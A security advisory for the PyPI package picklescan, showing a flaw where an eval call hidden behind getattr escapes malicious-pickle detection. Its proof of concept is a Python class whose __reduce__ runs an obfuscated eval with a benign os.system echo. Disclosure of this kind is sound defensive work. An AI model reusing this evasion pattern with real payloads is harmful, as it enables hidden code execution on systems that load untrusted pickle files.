@@ -1,0 +1,50 @@
+PYSEC-2026-1789 PyPI/picklescan — picklescan missing detection by simple obfuscation of a `builtins.eval` call
+package: picklescan
+ecosystem: PyPI
+versions affected:
+  >= 0, < 1.0.1 (ECOSYSTEM)
+aliases: CVE-2026-53874, GHSA-9m3x-qqw2-h32h
+references:
+  https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9m3x-qqw2-h32h
+  https://nvd.nist.gov/vuln/detail/CVE-2026-53874
+  https://github.com/mmaitre314/picklescan/pull/59
+  https://github.com/mmaitre314/picklescan/commit/173c8f2a869ea9b69b543477525ec70611c3c6f4
+  https://github.com/mmaitre314/picklescan
+  https://github.com/mmaitre314/picklescan/releases/tag/v1.0.1
+  https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-obfuscated-eval-call
+  https://pypi.org/project/picklescan
+  https://github.com/advisories/GHSA-9m3x-qqw2-h32h
+
+### Summary
+
+An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the host loading a pickle payload from an untrusted source.
+
+### Details
+
+It's possible to hide the `eval` call nested under another callable via `getattr`.
+
+### PoC
+
+```python
+import builtins
+
+class EvilClass:
+    @staticmethod
+    def _obfuscated_eval(payload):
+        getattr(builtins, "eval")(payload)
+
+    def __reduce__(self):
+        payload = "__import__('os').system('echo \"successful attack\"')"
+        return self._obfuscated_eval, (payload,)
+```
+
+
+### Impact
+
+Who is impacted? 
+Any organization or individual relying on picklescan to detect malicious pickle files from untrusted sources.
+
+What is the impact? 
+Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.
+
+Supply Chain Attack: Attackers can distribute infected pickle files to system that load serialized ML models, APIs, or saved Python objects from untrusted sources.
